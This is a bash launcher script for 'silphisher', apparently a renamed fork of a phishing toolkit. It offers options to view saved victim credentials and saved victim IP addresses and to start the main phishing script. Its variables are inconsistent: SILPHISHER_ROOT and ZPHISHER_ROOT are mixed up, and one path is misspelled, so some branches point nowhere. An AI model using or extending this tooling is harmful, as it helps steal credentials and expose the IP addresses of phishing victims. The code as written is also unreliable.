#!/bin/bash


if [[ $(uname -o) == *'Android'* ]];then
	SILPHISHER_ROOT="/data/data/com.termux/files/usr/opt/silzphisher"
else
	export ZPHISHER_ROOT="/opt/silzphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run silphisher type \`silphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $SILPHISHER_ROOT/arquivo/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZPHISHER_ROOT/arquivo/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $SILPHISHER_ROOT
	bash ./silphisher.sh
fi
